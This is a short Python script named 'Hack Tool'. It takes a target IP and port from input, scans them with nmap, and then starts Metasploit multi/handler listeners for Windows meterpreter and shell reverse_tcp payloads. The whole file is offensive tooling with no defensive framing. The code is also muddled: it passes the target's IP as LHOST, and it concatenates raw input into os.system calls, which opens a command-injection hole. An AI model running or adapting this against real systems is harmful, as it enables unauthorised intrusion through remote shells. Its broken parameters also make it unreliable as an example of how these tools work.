#!/usr/bin/env python
import os
import sys
 
def hack_tool():
    print("Welcome to the Hack Tool")
    print("Please enter the target IP address:")
    ip = input()
 
    print("Please enter the port to scan:")
    port = input()
 
     
    os.system("nmap -sV -p " + port + " " + ip)
    os.system("msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST " + ip +"; set LPORT " + port +"; run'")
    os.system("msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/shell_reverse_tcp; set LHOST " + ip +"; set LPORT " + port +"; run'") 
    os.system("msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST " + ip +"; set LPORT " + port +"; exit'")

    print("Hack Tool completed.")

if __name__ == '__main__': 								  
 hack_tool()
